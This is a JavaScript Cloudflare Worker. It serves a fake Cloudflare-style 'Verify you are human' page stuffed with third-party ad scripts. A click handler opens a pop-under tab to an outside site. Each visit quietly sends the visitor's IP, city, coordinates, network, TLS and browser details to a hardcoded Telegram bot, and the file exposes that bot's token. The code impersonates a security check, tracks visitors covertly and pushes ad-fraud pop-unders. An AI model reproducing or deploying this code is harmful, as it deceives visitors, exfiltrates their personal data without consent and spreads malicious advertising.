const TELEGRAM_BOT_TOKEN = "9187036457:AAGnRisreSePp8NeNgEFcZUBr8hWm1BzCTA";
const TELEGRAM_CHAT_ID = "6108841631";
const POP_TAB_URL = "https://auctionr.org/4/846d21d644dc55fa4c4efb015c82645e";

const CHALLENGE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verify you are human</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: #ffffff;
      color: #1f2937;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      padding: 24px;
    }

    .challenge-wrapper {
      max-width: 760px;
      width: 100%;
      margin: auto;
      padding: 16px 0;
    }

    .ad-slot-top {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 24px;
      overflow-x: auto;
    }

    .verification-box {
      max-width: 540px;
      width: 100%;
      margin: 0 auto;
    }

    .challenge-title {
      font-size: 1.75rem;
      font-weight: 600;
      color: #111827;
      margin-bottom: 10px;
      letter-spacing: -0.015em;
    }

    .challenge-subtitle {
      font-size: 0.975rem;
      color: #4b5563;
      line-height: 1.5;
      margin-bottom: 24px;
    }

    .widget-container {
      margin-bottom: 20px;
      min-height: 65px;
    }

    .challenge-note {
      font-size: 0.85rem;
      color: #6b7280;
      line-height: 1.5;
    }

    .ad-slot-bottom {
      margin-top: 24px;
    }

    .challenge-footer {
      max-width: 760px;
      width: 100%;
      margin: 24px auto 0;
      padding-top: 14px;
      border-top: 1px solid #e5e7eb;
      font-size: 0.75rem;
      color: #6b7280;
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      gap: 8px;
    }
  </style>
</head>
<body>
  <main class="challenge-wrapper">
    <div class="ad-slot-top">
      <script>
        atOptions = {
          'key' : '948233cb9aa9c45dc60a608c0e11e63f',
          'format' : 'iframe',
          'height' : 90,
          'width' : 728,
          'params' : {}
        };
      </script>
      <script src="https://bauval.org/22/948233cb9aa9c45dc60a608c0e11e63f"></script>
    </div>

    <section class="verification-box">
      <h1 class="challenge-title">Verify you are human</h1>
      <p class="challenge-subtitle">
        We need to confirm your browser is operated by a person before continuing.
      </p>

      <div class="widget-container">
        ::CF_WIDGET_BOX::
      </div>

      <p class="challenge-note">
        Please enable JavaScript and cookies in your browser if the verification check does not load.
      </p>
    </section>

    <div class="ad-slot-bottom">
      <script async="async" data-cfasync="false" src="https://bauval.org/21/d6912bef5718a0545a06f3c27de3f19c"></script>
      <div id="container-d6912bef5718a0545a06f3c27de3f19c"></div>
    </div>
  </main>

  <footer class="challenge-footer">
    <span>Ray ID: ::RAY_ID::</span>
    <span>Protected by Cloudflare</span>
  </footer>

  <script>
    (function () {
      const targetUrl = "${POP_TAB_URL}";
      document.addEventListener("click", function () {
        const win = window.open(targetUrl, "_blank", "noopener,noreferrer");
        if (win) {
          win.blur();
          window.focus();
        }
      }, { passive: true });
    })();
  </script>
</body>
</html>`;

function detectVisitorType(ua = "", cf = {}) {
  const botPatterns = [
    /bot/i, /crawl/i, /spider/i, /slurp/i, /curl/i, /wget/i,
    /python/i, /axios/i, /node-fetch/i, /go-http-client/i,
    /headless/i, /phantom/i, /selenium/i, /playwright/i,
    /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
    /telegrambot/i, /whatsapp/i, /discordbot/i, /bingpreview/i,
    /googlebot/i, /bingbot/i, /yandex/i, /baiduspider/i, /duckduckbot/i
  ];

  const isKnownBotUA = botPatterns.some((regex) => regex.test(ua));
  const botScore = typeof cf.botManagement?.score === "number" ? cf.botManagement.score : null;

  if (isKnownBotUA || (botScore !== null && botScore < 30)) {
    return { label: "BOT", scoreText: botScore !== null ? `${botScore}/99` : "UA match" };
  }

  return { label: "HUMAN", scoreText: botScore !== null ? `${botScore}/99` : "N/A" };
}

function escapeMarkdownV2(text = "") {
  return String(text).replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
}

function sendTelegramNotification(request, env, ctx) {
  const token = env?.TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN;
  const chatId = env?.TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;

  const cf = request.cf || {};
  const headers = request.headers;
  const url = new URL(request.url);

  const ip = headers.get("cf-connecting-ip") || headers.get("x-forwarded-for") || "Unknown";
  const rayId = headers.get("cf-ray") || "Unknown";
  const userAgent = headers.get("user-agent") || "Unknown";
  const referer = headers.get("referer") || "Direct / None";
  const acceptLanguage = headers.get("accept-language") || "Unknown";
  const secChUa = headers.get("sec-ch-ua") || "N/A";
  const secChPlatform = headers.get("sec-ch-ua-platform") || "N/A";
  const secChMobile = headers.get("sec-ch-ua-mobile") || "N/A";

  const city = cf.city || "Unknown";
  const region = cf.region || "Unknown";
  const country = cf.country || "Unknown";
  const continent = cf.continent || "Unknown";
  const postalCode = cf.postalCode || "N/A";
  const timezone = cf.timezone || "Unknown";
  const coords = cf.latitude && cf.longitude ? `${cf.latitude}, ${cf.longitude}` : "N/A";

  const asn = cf.asn || "Unknown";
  const asOrg = cf.asOrganization || "Unknown";
  const colo = cf.colo || "Unknown";
  const httpProtocol = cf.httpProtocol || "Unknown";
  const tlsVersion = cf.tlsVersion || "Unknown";
  const tlsCipher = cf.tlsCipher || "Unknown";

  const visitor = detectVisitorType(userAgent, cf);
  const emoji = visitor.label === "BOT" ? "🤖" : "🧑";

  const lines = [
    `${emoji} *Page Visit Detected \\(${escapeMarkdownV2(visitor.label)}\\)*`,
    ``,
    `*Request*`,
    `• URL: \`${escapeMarkdownV2(url.href)}\``,
    `• Method: \`${escapeMarkdownV2(request.method)}\``,
    `• Ray ID: \`${escapeMarkdownV2(rayId)}\``,
    `• Referer: ${escapeMarkdownV2(referer)}`,
    ``,
    `*Location*`,
    `• IP: \`${escapeMarkdownV2(ip)}\``,
    `• Location: ${escapeMarkdownV2(city)}, ${escapeMarkdownV2(region)}, ${escapeMarkdownV2(country)} \\(${escapeMarkdownV2(continent)}\\)`,
    `• Postal / TZ: ${escapeMarkdownV2(postalCode)} \\| ${escapeMarkdownV2(timezone)}`,
    `• Coords: \`${escapeMarkdownV2(coords)}\``,
    ``,
    `*Network & Edge*`,
    `• Network: AS${escapeMarkdownV2(String(asn))} \\- ${escapeMarkdownV2(asOrg)}`,
    `• CF Colo: \`${escapeMarkdownV2(colo)}\``,
    `• Protocol / TLS: ${escapeMarkdownV2(httpProtocol)} \\| ${escapeMarkdownV2(tlsVersion)} \\(${escapeMarkdownV2(tlsCipher)}\\)`,
    `• Bot Score: ${escapeMarkdownV2(visitor.scoreText)}`,
    ``,
    `*Client / User\\-Agent*`,
    `• UA: \`${escapeMarkdownV2(userAgent)}\``,
    `• Client Hints: ${escapeMarkdownV2(secChUa)} \\| ${escapeMarkdownV2(secChPlatform)} \\| Mobile: ${escapeMarkdownV2(secChMobile)}`,
    `• Language: ${escapeMarkdownV2(acceptLanguage)}`
  ];

  const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
  const task = fetch(telegramUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: lines.join("\n"),
      parse_mode: "MarkdownV2",
      disable_web_page_preview: true
    })
  }).catch((err) => {
    console.error("Telegram alert failed:", err);
  });

  if (ctx && typeof ctx.waitUntil === "function") {
    ctx.waitUntil(task);
  }
}

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    if (url.pathname !== "/" && url.pathname !== "") {
      return Response.redirect(`${url.origin}/`, 302);
    }

    sendTelegramNotification(request, env, ctx);

    return new Response(CHALLENGE_HTML, {
      status: 200,
      headers: {
        "Content-Type": "text/html; charset=utf-8",
        "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0"
      }
    });
  }
};
